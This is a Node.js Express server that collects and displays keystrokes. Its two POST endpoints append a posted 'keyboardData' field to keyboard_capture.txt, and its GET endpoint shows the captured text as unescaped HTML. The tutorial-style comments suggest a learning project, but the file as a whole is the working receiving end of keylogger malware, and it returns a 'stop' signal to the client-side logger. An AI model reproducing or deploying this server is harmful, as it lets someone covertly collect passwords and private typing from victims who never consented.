// We import the fs module so that we can have access to the file system.
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

// Create the express app.
const app = express();

/* app should use bodyParser. For this example we'll use json. bodyParser allows you to
access the body of your request.
*/
app.use(bodyParser.json({extended: true}));

// We assign the port number 8080.
const port = 8080;

// When a GET request is made to the "/" resource we return basic HTML.
app.get("/", (req, res) => {
    /* The GET request shows the data that's logged in the keyboard_capture.txt file.
    If the file keyboard_capture.txt has not yet been created, the try catch statement will
    throw an exception and log to the homepage that nothing's been logged yet.   
    */ 
    try {
        const kl_file = fs.readFileSync("./keyboard_capture.txt", { encoding: 'utf8', flag: 'r' });
        res.send(`<h1>Logged data</h1><p>${kl_file.replace(/\n/g, "<br>")}</p>`); // Replace all newlines with <br>
    } catch (error) {
        console.error("Error reading file:", error);
        res.send("<h1>Nothing logged yet.</h1>");
    }  
});


app.post("/", (req, res) => {
    try {
        const data = req.body.keyboardData + "\n"; // Ensure newline for consistency
        fs.appendFileSync("keyboard_capture.txt", data); // Append instead of overwriting
        console.log("Data logged:", req.body.keyboardData);
        res.send("Successfully logged the data.");
    } catch (error) {
        console.error("Error writing to file:", error);
        res.status(500).send("Failed to log data.");
    }
});

app.post("/api/keystrokes", (req, res) => {
    try {
        const data = req.body.keyboardData + "\n"; // Ensure newline for consistency
        fs.appendFileSync("keyboard_capture.txt", data); // Append instead of overwriting
        console.log("Data logged:", req.body.keyboardData);
        res.json({ message: "Successfully logged the data.", stop: false }); // Include stop signal
    } catch (error) {
        console.error("Error writing to file:", error);
        res.status(500).json({ message: "Failed to log data." });
    }
});

// We can see that the app is listening on which port.
app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
});
